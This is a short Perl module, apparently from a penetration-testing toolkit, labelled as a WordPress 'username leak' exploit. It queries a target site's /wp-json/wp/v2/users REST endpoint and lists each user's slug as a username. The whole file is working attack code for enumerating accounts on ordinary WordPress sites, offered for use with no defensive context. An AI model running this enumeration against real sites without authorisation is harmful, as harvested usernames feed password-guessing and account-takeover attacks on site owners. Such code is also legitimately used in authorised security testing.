package Spellbook::Exploit::Wordpress_Username_Leak;

use JSON;
use strict;
use warnings;
use Try::Tiny;
use LWP::UserAgent;

sub new {
    my ($self, $target)= @_;

    if ($target) {
        my $target = $target . "/wp-json/wp/v2/users";

        my $userAgent = LWP::UserAgent -> new();
	    my $request   = $userAgent -> get($target);
	    my $httpCode  = $request -> code();
        
        my @result = ();

        try {
            my $content = decode_json ($request -> content);
            
            foreach my $data (@$content) {
                my $username = $data -> {'slug'};
                
                push @result, "[+] - Username -> $username\n";
            }
        }
        
        catch {
            push @result, "[-] - Warning: it was not possible to extract users from this URL.\n";
        };

        return @result;
    }   
}

1;